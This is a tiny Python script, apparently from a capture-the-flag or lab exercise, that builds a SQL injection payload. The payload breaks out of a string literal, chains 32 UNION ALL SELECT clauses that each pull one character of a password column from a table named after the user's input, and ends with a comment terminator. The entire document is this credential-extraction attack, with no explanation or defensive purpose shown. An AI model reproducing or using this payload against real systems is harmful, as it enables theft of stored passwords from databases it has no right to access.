
id = input();
payload =  "' "

for i in range(32):
    payload += f"UNION ALL SELECT substr(password, {i + 1}, 1) FROM table_{id} "

payload += "; -- "

print(payload)
